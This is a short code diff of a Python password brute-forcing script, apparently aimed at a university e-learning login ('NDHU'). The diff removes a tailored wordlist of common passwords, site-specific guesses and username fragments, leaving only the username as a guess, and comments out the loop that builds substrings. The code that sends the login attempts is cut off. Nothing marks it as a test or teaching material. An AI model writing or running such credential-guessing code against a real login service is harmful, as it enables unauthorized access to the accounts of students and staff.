@@ -2,16 +2,11 @@ import requests
 
 
 def brute(username):
-    possible_passwords = [username, username+'0', 'ji32k7au4a83', 'au4a83',
-                        '123456', '12345678', '1qaz2wsx', '12345',
-                        'password', '1234567', 'abcd1234', 'qwerty',
-                        'ji394su3', 'qwertyuiop', '1234', 'ndhu',
-                        'NDHU', 'ndhuNDHU', 'NDHUndhu', 'elearning',
-                        'Elearning', 'eLearning', 'ELEARNING']
+    possible_passwords = [username]
 
-    for i in range(4, len(username)):
-        possible_passwords.append(username[:i])
-        possible_passwords.append(username[i:])
+    # for i in range(4, len(username)):
+    #     possible_passwords.append(username[:i])
+    #     possible_passwords.append(username[i:])
 
     print(f"\nFor user: {username}")
     for pw in possible_passwords:
